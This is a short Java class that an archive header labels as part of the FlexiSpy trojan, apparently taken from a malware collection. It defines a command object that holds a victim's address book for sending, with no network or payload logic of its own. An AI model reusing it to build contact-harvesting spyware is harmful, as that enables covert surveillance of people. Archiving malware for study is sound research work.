/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.phoenix.prot.command;

import com.vvt.phoenix.prot.event.AddressBook;

public class SendAddrBookForApproval implements CommandData{
	
	//Members
	private AddressBook mBook;

	@Override
	public int getCmd() {
		return CommandCode.SEND_ADDRESS_BOOK_FOR_APPROVAL;
	}
	
	public AddressBook getAddressBook(){
		return mBook;
	}
	public void setAddressBook(AddressBook book){
		mBook = book;
	}


}
